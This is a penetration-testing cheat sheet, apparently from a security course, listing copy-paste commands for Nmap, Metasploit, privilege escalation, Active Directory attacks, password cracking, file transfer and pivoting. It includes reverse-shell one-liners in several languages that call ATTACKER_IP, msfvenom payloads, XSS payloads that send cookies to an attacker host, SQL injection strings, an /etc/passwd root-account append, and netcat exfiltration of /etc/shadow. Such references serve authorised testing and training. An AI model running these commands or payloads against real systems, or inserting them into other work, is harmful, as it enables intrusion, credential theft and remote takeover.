# 📋 Cheat Sheets

## Quick Reference Commands for Every Security Tool — Copy, Paste, Hack

---

## Table of Contents

1. [Linux Commands](#linux-commands)
2. [Nmap](#nmap)
3. [Burp Suite](#burp-suite)
4. [Wireshark](#wireshark)
5. [Metasploit](#metasploit)
6. [Privilege Escalation - Linux](#privilege-escalation---linux)
7. [Privilege Escalation - Windows](#privilege-escalation---windows)
8. [Reverse Shells](#reverse-shells)
9. [Web Application Testing](#web-application-testing)
10. [Active Directory](#active-directory)
11. [Password Attacks](#password-attacks)
12. [File Transfers](#file-transfers)
13. [Pivoting & Tunneling](#pivoting--tunneling)
14. [OSINT](#osint)
15. [Forensics](#forensics)

---

## Linux Commands

### File System & Navigation

```bash
# Navigation
pwd                           # Current directory
ls -la                        # List all files (including hidden)
cd /path/to/dir               # Change directory
find / -name "*.txt" 2>/dev/null    # Find files by name
find / -perm -4000 2>/dev/null      # Find SUID binaries
find / -writable 2>/dev/null        # Find writable files
locate filename               # Fast file search (uses database)

# File Operations
cat file.txt                  # Display file contents
head -20 file.txt             # First 20 lines
tail -f /var/log/syslog       # Follow log in real-time
grep -r "password" /etc/      # Recursive search for string
grep -i "error" file.log      # Case-insensitive search
awk '{print $1}' file.txt     # Print first column
sed 's/old/new/g' file.txt    # Replace text
sort file.txt | uniq -c       # Count unique lines
wc -l file.txt                # Count lines

# Permissions
chmod 755 file.sh             # rwxr-xr-x
chmod +x script.sh            # Make executable
chown user:group file         # Change ownership
```

### User & System Info

```bash
# User Information
whoami                        # Current user
id                            # User ID, groups
who                           # Logged in users
w                             # Who is doing what
last                          # Login history
cat /etc/passwd               # All users
cat /etc/shadow               # Password hashes (need root)
cat /etc/group                # All groups
sudo -l                       # What can I sudo?

# System Information
uname -a                      # Kernel info
cat /etc/os-release           # OS version
hostname                      # System hostname
df -h                         # Disk usage
free -h                       # Memory usage
ps aux                        # All running processes
top                           # Real-time process monitor
systemctl list-units          # Active services
crontab -l                    # Current user's cron jobs
cat /etc/crontab              # System cron jobs
```

### Networking

```bash
# Network Information
ifconfig / ip a               # Network interfaces
ip route                      # Routing table
netstat -tulnp                # Listening ports (with PID)
ss -tulnp                     # Modern netstat
arp -a                        # ARP table
cat /etc/resolv.conf          # DNS configuration

# Network Tools
ping -c 3 target              # ICMP ping
traceroute target             # Trace route
dig domain.com                # DNS lookup
nslookup domain.com           # DNS lookup
host domain.com               # DNS lookup
curl -v https://target.com    # HTTP request (verbose)
wget http://target.com/file   # Download file
nc -lvnp 4444                 # Netcat listener
nc target 80                  # Connect to target port 80
```

---

## Nmap

### Scan Types

```bash
# Host Discovery
nmap -sn 192.168.1.0/24              # Ping sweep (no port scan)
nmap -Pn target                       # Skip host discovery (assume alive)

# Port Scanning
nmap target                           # Top 1000 ports (default)
nmap -p- target                       # ALL 65535 ports
nmap -p 80,443,8080 target           # Specific ports
nmap -p 1-1000 target                # Port range
nmap --top-ports 100 target          # Top 100 most common ports

# Scan Techniques
nmap -sS target                       # SYN scan (stealth, default with root)
nmap -sT target                       # TCP connect scan (no root needed)
nmap -sU target                       # UDP scan (slow)
nmap -sV target                       # Service version detection
nmap -sC target                       # Default scripts
nmap -O target                        # OS detection
nmap -A target                        # Aggressive (OS + version + scripts + traceroute)

# Speed & Stealth
nmap -T4 target                       # Faster timing (T0-T5)
nmap -T1 target                       # Slowest (IDS evasion)
nmap --min-rate 1000 target          # Minimum packets/second
nmap -f target                        # Fragment packets (firewall evasion)
nmap -D RND:10 target                # Decoy scan (10 random decoys)

# Output
nmap -oN scan.txt target             # Normal output
nmap -oX scan.xml target             # XML output
nmap -oG scan.grep target            # Grepable output
nmap -oA scan_all target             # All formats
```

### Nmap Scripts (NSE)

```bash
# Common NSE Scripts
nmap --script=vuln target                    # All vulnerability scripts
nmap --script=http-enum target               # HTTP directory enumeration
nmap --script=smb-enum-shares target         # SMB share enumeration
nmap --script=smb-vuln* target              # SMB vulnerabilities
nmap --script=ftp-anon target               # FTP anonymous login check
nmap --script=dns-brute target              # DNS brute force subdomains
nmap --script=ssl-heartbleed target         # Heartbleed check

# My Go-To Full Scan
nmap -sC -sV -oA nmap/initial target       # Initial scan
nmap -p- --min-rate 5000 -oA nmap/all target # All ports fast
# Then targeted scan on discovered ports:
nmap -sC -sV -p 80,443,8080 -oA nmap/targeted target
```

---

## Burp Suite

### Essential Shortcuts & Configuration

```
Keyboard Shortcuts:
Ctrl+R          → Send to Repeater
Ctrl+I          → Send to Intruder
Ctrl+Shift+R    → Send to Organizer
Ctrl+Shift+T    → New tab in Repeater
Ctrl+Space      → Send request (in Repeater)

Proxy Configuration:
- Browser proxy: 127.0.0.1:8080
- Install Burp CA certificate (http://burp)
- Scope: Target → Scope → Add target domain
- Filter: Show only in-scope items

Intruder Attack Types:
- Sniper: One payload position at a time
- Battering Ram: Same payload in all positions
- Pitchfork: Parallel payload lists (user+pass)
- Cluster Bomb: All combinations (user × pass)
```

### Common Burp Workflows

```
Authentication Testing:
1. Capture login request in Proxy
2. Send to Intruder
3. Mark password field as payload position
4. Load wordlist
5. Start attack
6. Sort by response length/status code (different = success)

Parameter Fuzzing:
1. Send request to Intruder
2. Mark target parameter
3. Use payload: fuzzing lists (SQLi, XSS, etc.)
4. Look for different response sizes/errors

Session Token Analysis:
1. Capture request with token
2. Send to Sequencer
3. Start live capture
4. Analyze randomness (should be >100 bits entropy)
```

---

## Wireshark

### Display Filters

```
# Protocol Filters
http                          # All HTTP traffic
dns                           # All DNS traffic  
tcp                           # All TCP traffic
udp                           # All UDP traffic
icmp                          # All ICMP traffic
arp                           # All ARP traffic
tls                           # All TLS/SSL traffic
ftp                           # All FTP traffic
smb                           # All SMB traffic

# IP Filters
ip.addr == 192.168.1.1       # Traffic to/from specific IP
ip.src == 192.168.1.1        # Traffic FROM specific IP
ip.dst == 192.168.1.1        # Traffic TO specific IP
ip.addr == 192.168.1.0/24    # Traffic to/from subnet

# Port Filters
tcp.port == 80               # TCP port 80 (either direction)
tcp.dstport == 443           # Destination port 443
udp.port == 53               # UDP port 53 (DNS)

# HTTP Specific
http.request.method == "POST"        # HTTP POST requests
http.request.uri contains "login"    # URLs containing "login"
http.response.code == 200            # HTTP 200 OK responses
http.response.code >= 400            # HTTP errors

# Credentials / Sensitive Data
http.authbasic                       # HTTP Basic auth (plaintext!)
ftp.request.command == "PASS"        # FTP passwords
smtp.req.parameter contains "@"      # Email addresses

# Combination Filters
ip.addr == 10.10.10.5 && tcp.port == 80   # Specific IP + port
http || dns                               # HTTP OR DNS
!(arp || dns)                             # NOT ARP and NOT DNS
tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN packets only (scan detection)

# Follow Streams
Right-click packet → Follow → TCP Stream  (see full conversation)
Right-click packet → Follow → HTTP Stream (see HTTP exchange)
```

### Wireshark Analysis Techniques

```
Detecting Attacks:
- Port scan: Many SYN packets to different ports from one IP
  Filter: tcp.flags.syn==1 && tcp.flags.ack==0
  Statistics → Conversations → Sort by packets

- ARP Spoofing: Duplicate IP with different MAC
  Filter: arp
  Look for: "duplicate use of IP detected"

- DNS Tunneling: Unusually long DNS queries
  Filter: dns
  Look for: Very long subdomain names in queries

- Credential Theft:
  Filter: http.request.method=="POST"
  Look for: login forms with username/password in body
```

---

## Metasploit

### Core Commands

```bash
# Starting Metasploit
msfconsole                            # Start Metasploit
msfdb init                            # Initialize database
db_status                             # Check database connection

# Searching
search type:exploit name:smb          # Search exploits by name
search cve:2021-44228                 # Search by CVE
search platform:windows type:exploit  # Filter by platform

# Using Modules
use exploit/windows/smb/ms17_010_eternalblue
show options                          # Required/optional settings
set RHOSTS 10.10.10.10               # Set target
set LHOST 10.10.14.5                 # Set your IP (for reverse shells)
set LPORT 4444                       # Set listener port
show payloads                        # Compatible payloads
set payload windows/x64/meterpreter/reverse_tcp
exploit / run                        # Execute

# Meterpreter Commands (post-exploitation)
sysinfo                              # System information
getuid                               # Current user
getsystem                            # Attempt privilege escalation
hashdump                             # Dump password hashes
ps                                   # List processes
migrate PID                          # Migrate to another process
shell                                # Drop to system shell
upload /local/file /remote/path      # Upload file
download /remote/file /local/path    # Download file
screenshot                           # Take screenshot
keyscan_start                        # Start keylogger
keyscan_dump                         # Dump keystrokes
run post/multi/recon/local_exploit_suggester  # Find local exploits
background                           # Background session
sessions -l                          # List sessions
sessions -i 1                        # Interact with session 1

# Payload Generation (msfvenom)
# Windows reverse shell:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# PHP web shell:
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# Python:
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py

# ASP:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# War (Tomcat):
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
```

---

## Privilege Escalation - Linux

### Enumeration

```bash
# Quick Wins
sudo -l                              # Check sudo permissions
find / -perm -4000 2>/dev/null       # SUID binaries
find / -perm -2000 2>/dev/null       # SGID binaries
cat /etc/crontab                     # Cron jobs
ls -la /etc/cron*                    # All cron directories
cat /etc/passwd                      # Users (look for /bin/bash)
ls -la /home/                        # Home directories
env                                  # Environment variables
cat /etc/fstab                       # Mounted file systems
mount                                # Currently mounted

# Automated Enumeration
# LinPEAS (best overall):
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum:
./LinEnum.sh -t

# linux-smart-enumeration:
./lse.sh -l 1
```

### Common Privilege Escalation Vectors

```bash
# SUDO Exploits (check sudo -l output)
# If (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!bash'

# If (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \;

# If (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# If (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
!/bin/bash

# If (ALL) NOPASSWD: /usr/bin/nmap (old versions)
sudo nmap --interactive
!sh

# SUID Exploits
# SUID on /usr/bin/python3:
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# SUID on /usr/bin/find:
find . -exec /bin/bash -p \;

# Writable /etc/passwd
# Generate password hash: openssl passwd -1 newpassword
# Add line: hacker:$1$hash:0:0:root:/root:/bin/bash
echo 'hacker:$1$xyz$abc:0:0::/root:/bin/bash' >> /etc/passwd
su hacker

# Cron Job Exploitation
# If writable script is in cron:
echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/cron/script.sh

# Kernel Exploits (last resort)
uname -r                             # Get kernel version
# Search: searchsploit linux kernel [version] privilege escalation

# Capabilities
getcap -r / 2>/dev/null
# python3 with cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## Privilege Escalation - Windows

### Enumeration

```powershell
# System Info
systeminfo                           # Full system information
hostname                             # Computer name
whoami /all                          # Current user + privileges
net user                             # All local users
net localgroup administrators        # Admin group members
net user username                    # Specific user info

# Network
ipconfig /all                        # Network configuration
netstat -ano                         # Open ports + PID
route print                          # Routing table
arp -a                               # ARP table

# Services & Processes
wmic service list brief              # All services
sc query                             # Running services
tasklist /svc                        # Processes with services
wmic process list brief              # Running processes

# Scheduled Tasks
schtasks /query /fo TABLE /nh        # Scheduled tasks

# Installed Software
wmic product get name,version        # Installed software
dir "C:\Program Files"               # Program files
dir "C:\Program Files (x86)"         # 32-bit programs

# Check Privileges
whoami /priv                         # Current privileges
```

### Common Windows PrivEsc

```powershell
# Unquoted Service Paths
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v """
# If found: place malicious exe in writable directory along the path

# Weak Service Permissions (accesschk from Sysinternals)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
# If SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG:
sc config servicename binPath= "C:\temp\shell.exe"
sc stop servicename
sc start servicename

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1: Generate MSI payload and install
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi

# Token Impersonation (if SeImpersonatePrivilege)
# Use: PrintSpoofer, JuicyPotato, GodPotato, RoguePotato
PrintSpoofer.exe -i -c cmd

# AutoRuns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# If writable path found: replace with malicious binary

# Saved Credentials
cmdkey /list                         # List saved credentials
runas /savecred /user:admin cmd.exe  # Use saved creds

# Automated Enumeration
# WinPEAS:
winpeas.exe
# PowerUp (PowerShell):
. .\PowerUp.ps1; Invoke-AllChecks
# Seatbelt:
Seatbelt.exe -group=all
```

---

## Reverse Shells

### One-Liners by Language

```bash
# ═══════════════════════════════════════
# REVERSE SHELLS - Replace IP and PORT
# ═══════════════════════════════════════

# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

# Bash (alternative)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat (traditional)
nc -e /bin/sh ATTACKER_IP PORT

# Netcat (OpenBSD - no -e flag)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Shell Stabilization

```bash
# After getting initial shell, stabilize it:

# Method 1: Python pty
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash

# Method 2: script
script /dev/null -c bash
# Then Ctrl+Z, stty raw -echo; fg

# Method 3: rlwrap (run BEFORE catching shell)
rlwrap nc -lvnp 4444
```

---

## Web Application Testing

### SQL Injection

```bash
# Authentication Bypass
' OR 1=1--
' OR '1'='1'--
admin'--
' OR 1=1#
" OR ""="

# UNION-Based (determine number of columns first)
' ORDER BY 1-- (increment until error)
' UNION SELECT NULL,NULL,NULL-- (match column count)
' UNION SELECT 1,2,3-- (find reflected columns)
' UNION SELECT username,password,NULL FROM users--

# Error-Based
' AND 1=CONVERT(int,(SELECT @@version))--
' AND extractvalue(1,concat(0x7e,(SELECT version())))--

# Blind Boolean
' AND 1=1-- (true - normal page)
' AND 1=2-- (false - different page)
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--

# Time-Based Blind
' AND SLEEP(5)-- (if response delayed = injectable)
'; WAITFOR DELAY '0:0:5'-- (MSSQL)

# SQLMap
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
sqlmap -r request.txt --batch                    # From Burp saved request
sqlmap -u "http://target.com/page?id=1" --os-shell   # OS shell
```

### XSS Payloads

```html
<!-- Basic -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Filter Bypass -->
<ScRiPt>alert('XSS')</ScRiPt>
<img src=x onerror="alert('XSS')">
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>

<!-- Cookie Stealing -->
<script>new Image().src="http://ATTACKER/steal?c="+document.cookie</script>
<img src=x onerror="fetch('http://ATTACKER/?c='+document.cookie)">

<!-- Encoding Bypass -->
<script>alert(String.fromCharCode(88,83,83))</script>
```

### Directory Enumeration

```bash
# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 50
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html

# ffuf (fastest)
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404     # Filter 404s
ffuf -u http://target.com/FUZZ.php -w wordlist.txt         # With extension

# Subdomain enumeration with ffuf
ffuf -u http://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200

# feroxbuster (recursive)
feroxbuster -u http://target.com -w wordlist.txt --depth 3
```

---

## Active Directory

### Enumeration

```bash
# BloodHound
bloodhound-python -u user -p 'password' -d domain.local -dc dc01.domain.local -c all
# Import .json files into BloodHound GUI

# Kerbrute (user enumeration)
kerbrute userenum --dc DC_IP -d domain.local userlist.txt

# enum4linux
enum4linux -a DC_IP

# ldapsearch
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local"

# CrackMapExec
crackmapexec smb DC_IP -u '' -p '' --shares          # Null session
crackmapexec smb DC_IP -u user -p pass --shares      # Auth shares
crackmapexec smb SUBNET/24 -u user -p pass           # Spray across network
```

### Attacks

```bash
# Kerberoasting
impacket-GetUserSPNs domain.local/user:password -dc-ip DC_IP -request
# Crack with hashcat:
hashcat -m 13100 hash.txt wordlist.txt

# AS-REP Roasting
impacket-GetNPUsers domain.local/ -dc-ip DC_IP -usersfile users.txt -no-pass
# Crack with hashcat:
hashcat -m 18200 hash.txt wordlist.txt

# Pass-the-Hash
impacket-psexec domain.local/user@TARGET -hashes :NTHASH
crackmapexec smb TARGET -u user -H NTHASH
evil-winrm -i TARGET -u user -H NTHASH

# DCSync
impacket-secretsdump domain.local/admin:password@DC_IP
# OR with hash:
impacket-secretsdump domain.local/admin@DC_IP -hashes :NTHASH

# Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec domain.local/administrator@DC -k -no-pass
```

---

## Password Attacks

```bash
# Hashcat (GPU cracking)
hashcat -m 0 hash.txt wordlist.txt          # MD5
hashcat -m 1000 hash.txt wordlist.txt       # NTLM
hashcat -m 1800 hash.txt wordlist.txt       # sha512crypt (Linux)
hashcat -m 13100 hash.txt wordlist.txt      # Kerberoast
hashcat -m 18200 hash.txt wordlist.txt      # AS-REP Roast
hashcat -m 5600 hash.txt wordlist.txt       # NTLMv2

# John the Ripper
john --wordlist=rockyou.txt hash.txt
john --format=raw-md5 hash.txt
john --show hash.txt                         # Show cracked

# Hydra (online brute force)
hydra -l admin -P wordlist.txt target ssh
hydra -l admin -P wordlist.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -L users.txt -P wordlist.txt target ftp

# CrackMapExec (password spraying)
crackmapexec smb DC_IP -u users.txt -p 'Spring2024!' --continue-on-success
```

---

## File Transfers

```bash
# ═══ ATTACKER → TARGET ═══

# Python HTTP Server (on attacker)
python3 -m http.server 8000
# On target (Linux):
wget http://ATTACKER_IP:8000/file
curl http://ATTACKER_IP:8000/file -o file
# On target (Windows):
certutil -urlcache -f http://ATTACKER_IP:8000/file.exe file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8000/file.exe','file.exe')"
iwr http://ATTACKER_IP:8000/file.exe -OutFile file.exe

# SCP (if SSH available)
scp file.txt user@target:/tmp/

# ═══ TARGET → ATTACKER ═══

# Netcat
# Attacker: nc -lvnp 4444 > received_file
# Target: nc ATTACKER_IP 4444 < /etc/shadow

# Base64 (when no file transfer possible)
# Target: cat file | base64
# Copy output, on attacker: echo "BASE64STRING" | base64 -d > file
```

---

## Pivoting & Tunneling

```bash
# SSH Local Port Forward (access internal service through SSH)
ssh -L LOCAL_PORT:INTERNAL_IP:REMOTE_PORT user@pivot_host
# Example: Access internal web server (10.10.10.20:80) through pivot (10.10.10.5)
ssh -L 8080:10.10.10.20:80 user@10.10.10.5
# Then browse: http://localhost:8080

# SSH Dynamic Port Forward (SOCKS proxy)
ssh -D 9050 user@pivot_host
# Configure proxychains: /etc/proxychains.conf → socks5 127.0.0.1 9050
proxychains nmap -sT 10.10.10.0/24

# SSH Remote Port Forward (expose local service to target network)
ssh -R REMOTE_PORT:LOCAL_IP:LOCAL_PORT user@target

# Chisel (doesn't need SSH)
# Attacker (server): chisel server --reverse -p 8000
# Target (client): chisel client ATTACKER_IP:8000 R:9050:socks
# Then use proxychains through port 9050

# Ligolo-ng (modern tunneling)
# Proxy (attacker): ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# Agent (target): ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert
```

---

## OSINT

```bash
# Subdomain Enumeration
subfinder -d target.com -all -o subs.txt
amass enum -passive -d target.com
assetfinder --subs-only target.com

# Email Harvesting
theHarvester -d target.com -b all
hunter.io (web interface)

# Technology Detection
whatweb target.com
wappalyzer (browser extension)

# Google Dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql | ext:env | ext:log
"target.com" password | secret | credentials

# Wayback Machine
waybackurls target.com | sort -u
gau target.com

# Social Media
sherlock username                    # Check username across platforms
```

---

## Forensics

```bash
# File Analysis
file suspicious_file                 # Identify file type
strings suspicious_file              # Extract readable strings
strings -e l suspicious_file         # Unicode strings (little-endian)
hexdump -C file | head              # Hex dump
exiftool file.jpg                   # Metadata extraction
binwalk firmware.bin                # Extract embedded files
foremost -i disk.img                # Carve files from image

# Memory Forensics (Volatility 3)
vol -f memory.dmp windows.info      # System info
vol -f memory.dmp windows.pslist    # Process list
vol -f memory.dmp windows.pstree    # Process tree
vol -f memory.dmp windows.netscan   # Network connections
vol -f memory.dmp windows.cmdline   # Command line args
vol -f memory.dmp windows.filescan  # Open files
vol -f memory.dmp windows.hashdump  # Password hashes

# Disk Forensics
fdisk -l disk.img                   # Partition info
mount -o loop,ro disk.img /mnt     # Mount read-only
autopsy                            # GUI forensic tool

# Log Analysis
grep -i "failed" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
# → Top failed login source IPs
```

---

**Next:** → [27-Labs](../27-Labs/README.md)

*"A good cheat sheet isn't a crutch — it's a force multiplier that lets you focus on strategy instead of syntax."*
